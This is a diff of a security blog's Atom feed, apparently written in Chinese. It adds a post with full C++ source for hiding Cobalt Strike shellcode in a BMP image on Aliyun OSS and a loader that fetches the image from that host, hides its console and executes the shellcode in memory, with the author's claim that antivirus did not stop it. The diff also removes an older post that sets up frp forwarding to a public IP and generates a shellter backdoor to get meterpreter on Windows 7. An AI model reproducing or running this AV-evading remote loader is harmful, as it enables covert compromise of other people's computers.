@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ru1e.github.io</id>
     <title>斯文beast | 世界很大，你我很小</title>
-    <updated>2020-08-11T07:54:41.078Z</updated>
+    <updated>2020-08-28T07:04:53.422Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ru1e.github.io"/>
     <link rel="self" href="https://ru1e.github.io/atom.xml"/>
@@ -10,6 +10,446 @@
     <logo>https://ru1e.github.io/images/avatar.png</logo>
     <icon>https://ru1e.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 斯文beast | 世界很大，你我很小</rights>
+    <entry>
+        <title type="html"><![CDATA[【学习】图片隐写shellcode进行远程加载过AV]]></title>
+        <id>https://ru1e.github.io/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/</id>
+        <link href="https://ru1e.github.io/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/">
+        </link>
+        <updated>2020-08-27T08:47:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-参考链接">0x01 参考链接</h3>
+<ol>
+<li>https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</li>
+<li>https://www.t00ls.net/redirect-57618.html#lastpost</li>
+</ol>
+<h3 id="0x02-学习思路">0x02 学习思路</h3>
+<p><strong>改动：修改了原exe执行后存在控制台现象，目前是控制台自动消失后台静默执行</strong></p>
+<pre><code>1. CS生成C的shellcode，使用Python进行Hex编码
+2. 将Hex编码注入到bmp图片的文件头
+3. 图片上传到公网,此处为阿里的对象存储oss里
+3. 获得图片，解析出shellcode后执行
+</code></pre>
+<h3 id="0x03-从0到1的前期准备">0x03 从0到1的前期准备</h3>
+<pre><code>1. 安装Visual Studio 2019 ，这个需要些时间安装一些依赖库，推荐专业版，可以搜索安装教程照做即可
+</code></pre>
+<p>https://visualstudio.microsoft.com/zh-hans/vs/<br>
+https://www.cnblogs.com/hsjj/p/VisualStudio.html</p>
+<pre><code>2. 开通阿里云对象存储OSS服务
+  登录阿里云-控制台-对象存储-开通成功-创建Bucket(修改为公共读，其他默认)
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ru1e.github.io/post-images/1598524329860.png" alt="" loading="lazy"></figure>
+<pre><code>3. CS生成shellcode，将payload.c里的shellcode使用python进行Hex编码
+</code></pre>
+<p><img src="https://ru1e.github.io/post-images/1598525253896.png" alt="" loading="lazy"><br>
+<img src="https://ru1e.github.io/post-images/1598525263644.png" alt="" loading="lazy"><br>
+<img src="https://ru1e.github.io/post-images/1598525420498.png" alt="" loading="lazy"></p>
+<pre><code>4. getImgshellcode.exe  做好生成准备，此exe功能是将shellcode注入bmp图片文件
+</code></pre>
+<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode
+
+核心代码
+#include &quot;dwBmpSize.h&quot;
+#include &lt;iostream&gt;
+using namespace std;
+
+CBMPHide::CBMPHide()
+{
+	sBmpFileName = &quot;&quot;;
+	pBuf = 0;
+	dwBmpSize = 0;
+	ptxtBuf = 0;
+	pExEBuf = 0;
+}
+
+CBMPHide::~CBMPHide()
+{
+
+}
+
+bool CBMPHide::setBmpFileName(char* szFileName)
+{
+	this-&gt;sBmpFileName = szFileName;
+	if (pBuf)	//如果已经生成就释放掉
+	{
+		delete[]pBuf;
+	}
+
+	HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
+	if (hfile == INVALID_HANDLE_VALUE)
+	{
+		return false;
+	}
+
+	//和struct BITMAPFILEHEADER bmfh里面的 bfSize的大小应该是一样的。
+	dwBmpSize = GetFileSize(hfile, 0);	//获取文件的大小
+	pBuf = new byte[dwBmpSize + 83968];
+	DWORD dwRead = 0;
+	ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0);
+	if (dwRead != dwBmpSize)
+	{
+		delete[]pBuf;
+		pBuf = 0;
+		return false;
+	}
+	CloseHandle(hfile);
+	m_fileHdr = (BITMAPFILEHEADER*)pBuf;
+	m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER));
+	return true;	//成功话就是文件的内容读取到pBuf里面
+}
+
+
+int CBMPHide::getBmpWidth()
+{
+	return m_infoHdr-&gt;biWidth;
+}
+
+int CBMPHide::getBmpHeight()
+{
+	return m_infoHdr-&gt;biHeight;
+}
+
+int CBMPHide::getBmpBitCount()
+{
+	return m_infoHdr-&gt;biBitCount;
+}
+
+bool CBMPHide::save()
+{
+	string sDstFileName = &quot;save.bmp&quot;;
+	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
+		GENERIC_READ | GENERIC_WRITE,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		CREATE_ALWAYS, 0, 0);
+	if (hfile == INVALID_HANDLE_VALUE)
+	{
+		return false;
+	}
+
+	DWORD dwWritten = 0;
+	WriteFile(hfile, pBuf, dwBmpSize + 83968, &amp;dwWritten, 0);
+	if (dwBmpSize != dwWritten)
+	{
+		return false;
+	}
+	CloseHandle(hfile);
+	return true;
+}
+//隐藏一个字符串到图片中，把字符串拆成字节，写入每个像素的alpha通道中
+bool CBMPHide::hideString2BMP(char* szStr2Hide)
+{
+	LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3;	//第一个像素的通道位置
+	//cout &lt;&lt; pAlpha &lt;&lt; endl;
+	int nHide;	//成功隐藏的字节数
+
+	//每次循环写入一个字节，吸入alpha通道
+	//(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize这个是判断字符串是太大，图片不能隐藏
+	for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4)
+	{
+		//cout &lt;&lt; nHide &lt;&lt; endl;
+		*pAlpha = szStr2Hide[nHide];	//写入一个字节
+		//cout &lt;&lt; pAlpha &lt;&lt; endl;
+	}
+
+	return true;
+}
+
+void CBMPHide::showStringInBmp(char* szBmpFIleName/*=NULL*/)
+{
+	string sDstFileName = &quot;save.bmp&quot;;
+	sDstFileName = szBmpFIleName;
+
+	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
+		GENERIC_READ | GENERIC_WRITE,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING, 0, 0);
+	if (hfile == INVALID_HANDLE_VALUE)
+	{
+		return;
+	}
+	DWORD dwSize = GetFileSize(hfile, 0);
+	LPBYTE pBuf1 = new byte[dwSize];
+
+	DWORD dwRead = 0;
+
+	ReadFile(hfile, pBuf1, dwSize, &amp;dwRead, 0);
+	CloseHandle(hfile);
+
+	//文件内容读取到pBuf1中
+	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuf1;
+	LPBYTE pStr = pBuf1 + pHdr-&gt;bfOffBits + 3;
+	char szTmp[1280];
+	RtlZeroMemory(szTmp, 1280);
+	for (int i = 0; i &lt; 1280; i++)
+	{
+		if (*pStr == 0 || *pStr == 0xFF)
+		{
+			break;
+		}
+		szTmp[i] = *pStr;
+		pStr += 4;
+	}
+	printf_s(szTmp);
+
+	delete[]pBuf1;
+}
+
+int main(int argc, char* argv[])
+{
+	if (argc &lt; 2)
+	{
+		wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\n&quot;, argv[0]);
+		return -1;
+	}
+
+
+	CBMPHide hide;
+	hide.setBmpFileName((char*)&quot;test.bmp&quot;);
+	printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\n&quot;,
+		hide.getBmpWidth(),
+		hide.getBmpHeight(),
+		hide.getBmpBitCount());
+	char* shellcode = argv[1];
+	hide.hideString2BMP((char*)shellcode);
+	hide.save();
+	cout &lt;&lt; shellcode &lt;&lt; endl;
+}
+
+</code></pre>
+<pre><code>5. 将任意.bmp图片文件放入和getImgshellcode.exe同目录并改名为test.bmp,运行到阿里OSS里，点击上传的图片获得访问URL并复制
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://ru1e.github.io/post-images/1598580605228.png" alt="" loading="lazy"></figure>
+<pre><code>5. ShellcodeImg.exe 做好生成准备，此exe功能是获得远程图片，执行shellcode
+</code></pre>
+<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode
+
+核心代码
+#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;Winhttp.h&gt;
+#include &lt;WinDNS.h&gt;
+#include &lt;iterator&gt;
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;WinDNS.h&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+
+#pragma comment(lib,&quot;Winhttp.lib&quot;)
+#pragma comment(lib,&quot;urlmon.lib&quot;)
+
+
+
+using namespace std;
+
+struct CachedDnsRecord
+{
+	wstring name;
+	int type;
+};
+
+#define INET_ADDRSTRLEN     22
+#define INET6_ADDRSTRLEN    65
+
+
+typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN);
+
+typedef struct _URL_INFO
+{
+	WCHAR szScheme[512];
+	WCHAR szHostName[512];
+	WCHAR szUserName[512];
+	WCHAR szPassword[512];
+	WCHAR szUrlPath[512];
+	WCHAR szExtraInfo[512];
+}URL_INFO, * PURL_INFO;
+
+
+
+
+void dcallback(int ContentSize, int file_size)
+{
+	//printf(&quot;count:%d,size:%d\n&quot;, ContentSize, file_size);
+}
+
+void download(const wchar_t* Url, const wchar_t* FileName, DownLoadCallback Func)
+{
+	URL_INFO url_info = { 0 };
+	URL_COMPONENTSW lpUrlComponents = { 0 };
+	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
+	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
+	lpUrlComponents.lpszHostName = url_info.szHostName;
+	lpUrlComponents.lpszPassword = url_info.szPassword;
+	lpUrlComponents.lpszScheme = url_info.szScheme;
+	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
+	lpUrlComponents.lpszUserName = url_info.szUserName;
+
+	lpUrlComponents.dwExtraInfoLength =
+		lpUrlComponents.dwHostNameLength =
+		lpUrlComponents.dwPasswordLength =
+		lpUrlComponents.dwSchemeLength =
+		lpUrlComponents.dwUrlPathLength =
+		lpUrlComponents.dwUserNameLength = 512;
+
+	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents);
+
+	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
+	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
+	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+	WinHttpReceiveResponse(hRequest, 0);
+	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);
+	WinHttpCloseHandle(hRequest);
+
+	hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+	WinHttpReceiveResponse(hRequest, 0);
+
+	BYTE* pBuffer = NULL;
+	pBuffer = new BYTE[dwContentSize];
+	ZeroMemory(pBuffer, dwContentSize);
+	do {
+		WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
+		Func(dwContentSize, dwReadBytes);
+	} while (dwReadBytes == 0);
+	//cout &lt;&lt; pBuffer &lt;&lt; endl;
+	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuffer;
+
+	LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3;
+	char szTmp[1900];
+	RtlZeroMemory(szTmp, 1900);
+	
+	for (int i = 0; i &lt; 1900; i++)
+	{
+
+		if (*pStr == 0 || *pStr == 0xFF)
+		{
+	
+			break;
+		}
+		
+		szTmp[i] = *pStr;
+		pStr += 4;
+
+	}
+	
+
+	unsigned int char_in_hex;
+	unsigned int iterations = strlen(szTmp);
+
+	unsigned int memory_allocation = strlen(szTmp) / 2;
+
+	VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);
+
+	for (unsigned int i = 0; i &lt; iterations / 2; i++) {
+		sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
+		szTmp[i] = (char)char_in_hex;
+
+	}
+	
+
+	void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
+	
+	memcpy(abvc, szTmp, memory_allocation);
+	
+	DWORD ignore;
+	VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore);
+
+	(*(void(*)()) abvc)();
+	delete pBuffer;
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	WinHttpCloseHandle(hSession);
+
+}
+
+
+typedef struct _DNS_CACHE_ENTRY
+{
+	struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry
+	PWSTR pszName; // DNS Record Name
+	unsigned short wType; // DNS Record Type
+	unsigned short wDataLength; // Not referenced
+	unsigned long dwFlags; // DNS Record Flags
+} DNSCACHEENTRY, * PDNSCACHEENTRY;
+
+typedef int(WINAPI* DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY);
+
+vector&lt;CachedDnsRecord&gt; getDnsCache()
+{
+	vector&lt;CachedDnsRecord&gt; results;
+
+	PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
+	HINSTANCE hLib = LoadLibrary(TEXT(&quot;DNSAPI.dll&quot;));
+	DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
+		(DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, &quot;DnsGetCacheDataTable&quot;);
+
+	int stat = DnsGetCacheDataTable(pEntry);
+	pEntry = pEntry-&gt;pNext;
+	while (pEntry)
+	{
+		CachedDnsRecord record;
+		record.name = wstring(pEntry-&gt;pszName);
+		record.type = pEntry-&gt;wType;
+		results.push_back(record);
+		pEntry = pEntry-&gt;pNext;
+	}
+	free(pEntry);
+	if (!results.empty())
+	{	
+	
+		download(L&quot;https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp&quot;, L&quot;1633Music&quot;, &amp;dcallback);
+	}
+	else
+	{
+		exit(0);
+	}
+	return results;
+}
+
+
+int main()
+{
+	HWND hwndDOS = GetForegroundWindow();
+	ShowWindow(hwndDOS, SW_HIDE);
+	auto cache = getDnsCache();
+	return 0;
+
+}
+</code></pre>
+<h3 id="0x04-开始运行">0x04 开始运行</h3>
+<pre><code>1. 将任意.bmp图片文件改成test.bmp放入生成的getImgshellcode.exe同目录,并且复制生成好的Hex编码后的shellcode，进行注入,同目录生成save.bmp
+</code></pre>
+<p><img src="https://ru1e.github.io/post-images/1598581597391.png" alt="" loading="lazy"><br>
+<img src="https://ru1e.github.io/post-images/1598581705437.png" alt="" loading="lazy"></p>
+<pre><code>2. 上传save.bmp到阿里OSS里，点击上传的图片获得访问URL并复制
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://ru1e.github.io/post-images/1598580605228.png" alt="" loading="lazy"></figure>
+<pre><code>3. 生成ShellcodeImg.exe，先修改176行的图片地址为上步骤的URL在生成
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://ru1e.github.io/post-images/1598583016304.png" alt="" loading="lazy"></figure>
+<pre><code>4. 在公网vps模拟真实环境运行AV情况下执行ShellcodeImg.exe，并未遭到拦截，且成功执行命令
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ru1e.github.io/post-images/1598596035905.gif" alt="" loading="lazy"></figure>
+<h3 id="0x05-可能会有用的小知识">0x05 &quot;可能&quot;会有用的小知识</h3>
+<pre><code>1. 如果想要在其他机器运行成功VS生成的exe时，生成时要选择Release，为了兼容性选择x86，然后生成即可
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://ru1e.github.io/post-images/1598596419676.png" alt="" loading="lazy"></figure>
+<pre><code>2. VS建造的项目文件夹都会存在.sln文件，双击.sln文件即可自动打开整个项目，还原项目本身
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://ru1e.github.io/post-images/1598596650878.png" alt="" loading="lazy"></figure>
+<h3 id="0x06-可能会遇到的问题">0x06 &quot;可能&quot;会遇到的问题</h3>
+<pre><code>1. exe执行后无法正常上线，原因可能是填入图片URL的时候没有加入端口，导致并未成功下载图片解析，如图就是没有写端口导致运行时并未成功获得图片进行解析
+   正确：https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp
+   错误：https://code.oss-cn-beijing.aliyuncs.com/save.bmp
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ru1e.github.io/post-images/1598597977930.png" alt="" loading="lazy"></figure>
+<ul>
+<li><strong>【可改进的地方】: 现在的操作是运行exe后生成控制台然后关闭控制台操作，会有控制台闪一下然后消失的界面，过程虽然很快，但对配置低的机器还是有感的，如果添加运行exe后不出现控制台也就是不出现窗口直接隐藏后台静默执行的代码生成后会被AV检测查杀，希望以后有师傅进行改进吧 0.0 !</strong></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2020-5902 BIG-IP RCE  绕过tmsh限制命令执行&EXP编写]]></title>
         <id>https://ru1e.github.io/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/</id>
@@ -796,67 +1236,6 @@ if __name__ == '__main__':
         <content type="html"><![CDATA[<ul>
 <li>细节在tools里，我就是过年不知道发啥，大晚上那就复现一下吧。。吧。（抢到个云悉邀请码，开森）<br>
 <img src="https://ru1e.github.io/post-images/1577810790913.png" alt="" loading="lazy"></li>
-</ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[kali转发公网+过杀毒+配合msf入侵windows7]]></title>
-        <id>https://ru1e.github.io/post/RD6ZQ1MX_/</id>
-        <link href="https://ru1e.github.io/post/RD6ZQ1MX_/">
-        </link>
-        <updated>2019-12-27T06:57:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-此篇为个人记录">0x01 此篇为个人记录</h3>
-<ul>
-<li>
-<pre><code>  工具人一枚，
-</code></pre>
-</li>
-<li>
-<pre><code>             就会组合操作，
-</code></pre>
-</li>
-<li>
-<pre><code>                           菜是原罪。
-</code></pre>
-</li>
-</ul>
-<h3 id="0x02-配置frp使kali接受公网shell">0x02 配置frp，使kali接受公网shell</h3>
-<p>配置内容：</p>
-<pre><code>公网windows的frps.ini配置内容
-[common]
-bind_port = 7000
-dashboard_port = 7500
-dashboard_user = admin
-dashboard_pwd = admin
-
-虚拟机kali机的frpc.ini配置内容
-[common]
-server_addr = 129.28.191.182   //鄙人的公网ip
-server_port = 7000
-
-[msf]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 6666
-remote_port = 4446
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://ru1e.github.io/post-images/1577431332788.png" alt="" loading="lazy"></figure>
-<pre><code>* 命令按顺序排序：
-
-./frps -c frps.ini &gt; log.txt &amp;                  //公网windows开启frp
-./frpc -c frpc.ini &gt; log.txt &amp;                     //虚拟机kali开启frp
-后门设置：lhsot：129.28.191.182   lport:4446
-
-</code></pre>
-<h3 id="0x03-shellter生成后门">0x03 shellter生成后门</h3>
-<ul>
-<li>尝试过多种方法，最后发现这个比较香（目标机器为*60时，可用）<br>
-<img src="https://ru1e.github.io/post-images/1577434809015.gif" alt="" loading="lazy"></li>
-</ul>
-<h3 id="0x04-在win7的60套餐中获得meterpreter">0x04 在Win7的*60套餐中获得meterpreter</h3>
-<ul>
-<li>下次联动cs，作为web狗得慢慢来 -.-!<br>
-<img src="https://ru1e.github.io/post-images/1577435547116.gif" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
